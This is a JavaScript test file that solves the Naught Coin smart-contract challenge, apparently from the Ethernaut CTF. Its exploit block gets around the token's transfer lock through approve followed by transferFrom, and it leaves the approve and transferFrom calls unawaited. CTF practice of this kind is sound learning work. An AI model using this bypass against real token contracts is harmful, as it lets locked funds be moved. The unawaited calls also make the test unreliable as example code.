const { ether, expectRevert, expectEvent } = require('@openzeppelin/test-helpers');

const NaughtCoin = artifacts.require('NaughtCoin');

const { expect } = require('chai');
const send = require('@openzeppelin/test-helpers/src/send');

contract('[Challenge] Naught Coin', function ([attacker, attacker2, ...otherAccounts]) {
  before(async function () {
    /** SETUP SCENARIO */
    this.naughtCoin = await NaughtCoin.new(attacker, { from: attacker });
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    this.naughtCoin.approve(attacker2, ether('1000000'), { from: attacker });
    this.naughtCoin.transferFrom(attacker, attacker2, ether('1000000'), { from: attacker2 });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.naughtCoin.balanceOf(attacker)).to.be.bignumber.eq('0');
    expect(await this.naughtCoin.balanceOf(attacker2)).to.be.bignumber.eq(ether('1000000'));
  });
});
